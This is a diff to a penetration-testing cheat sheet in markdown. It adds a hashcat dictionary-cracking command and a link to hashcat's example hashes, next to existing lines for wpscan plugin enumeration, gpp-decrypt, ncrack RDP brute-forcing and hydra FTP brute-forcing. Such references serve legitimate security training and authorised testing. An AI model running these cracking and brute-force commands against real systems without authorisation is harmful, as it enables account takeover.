@@ -127,9 +127,12 @@ wpscan --url http://<adress>/ -e ap (plugin)
 # Brute Force Attack ✅📚
 ## Crack Type Cheat Sheet ✅
 ```bash
+hashcat -m 0 -a 0 hash.txt wordlist.txt
 gpp-decrypt [hash] # Group Policy Preferences (GPP)
 ncrack -vv --user username -P password-file.txt rdp://[host] # Ncrack can be used to crack RDP passwords:
 ```
+[example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
+
 ## Hydra Attack Type Cheat Sheet ✅
 ```bash
 hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -vV $ip ftp
